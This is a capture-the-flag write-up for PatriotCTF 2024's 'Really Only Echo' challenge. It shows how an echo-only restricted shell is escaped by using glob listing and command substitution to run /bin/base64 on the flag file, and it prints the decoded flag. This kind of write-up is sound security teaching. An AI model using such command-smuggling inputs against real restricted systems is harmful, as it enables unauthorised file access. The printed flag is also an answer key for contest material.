# PatriotCTF 2024 - Really Only Echo
**Title:** Really Only Echo

**Description:** Hey, I have made a terminal that only uses echo, can you find the flag?
`nc chal.competitivecyber.club 3333`

**Files:** server.py

## Solution:
So, in this challenge we were given a terminal where we can only use the `echo` command, now the first step should be to locate where the flag might be, I start searching from the `root` directory:
```bash
Please input command: echo /*
/bin /boot /dev /etc /flag.txt /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var
```

And there's the `flag.txt` file, Naturally, the next step is to attempt to read it using `echo`:
```bash
Please input command: echo $(</flag.txt)
```

Unfortunately, this attempt to read the file fails. Since direct access to the file is blocked, I decide to explore `/bin`, which contains various executable programs. By listing the contents of `/bin`, I look for something that can help:
```bash
Please input command: echo /bin/* 
/bin/[ /bin/base64 /bin/cat /bin/echo /bin/bash ...
```

I spot `/bin/base64`, a program that can encode or decode base64 strings. Using this tool, I attempt to base64-encode the contents of the flag:
```bash
Please input command: echo $(/bin/base64 /flag.txt)
cGN0ZntlY2hvX2lzX3N1Y2hfYV92ZXJzYXRpbGVfY29tbWFuZH0=
```

The output is a base64-encoded string. Decoding this string gives us the flag:
```bash
$ echo "cGN0ZntlY2hvX2lzX3N1Y2hfYV92ZXJzYXRpbGVfY29tbWFuZH0=" | base64 -d
pctf{echo_is_such_a_versatile_command}
```